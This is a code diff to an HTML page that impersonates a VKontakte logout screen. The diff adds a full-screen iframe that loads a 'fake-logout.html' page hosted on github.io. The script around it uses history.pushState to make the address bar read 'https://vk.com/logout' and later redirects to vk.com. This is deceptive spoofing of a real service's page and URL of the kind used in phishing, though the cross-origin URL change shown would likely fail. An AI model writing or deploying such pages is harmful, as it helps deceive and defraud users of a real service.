@@ -82,6 +82,14 @@
       font-size: 13px;
       margin-top: 40px;
     }
+
+    iframe {
+      width: 100%;
+      height: 100vh;
+      border: none;
+      display: block;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -100,11 +108,14 @@
     &copy; 2025 ВКонтакте LLC
   </footer>
 
+  <!-- Создаём iframe, который загружает эту же страницу -->
+  <iframe src="https://jkeep1990.github.io/VK_LOGOUT/fake-logout.html"></iframe>
+
   <script>
     // Меняем URL в адресной строке на vk.com/logout, без перезагрузки страницы
     history.pushState(null, null, 'https://vk.com/logout');
 
-  <script>
+    // Автоматически перенаправляем на главную страницу через 155 секунд (в данном случае не важно, будет ли происходить редирект)
     setTimeout(() => {
       window.location.href = "https://vk.com";
     }, 155000);
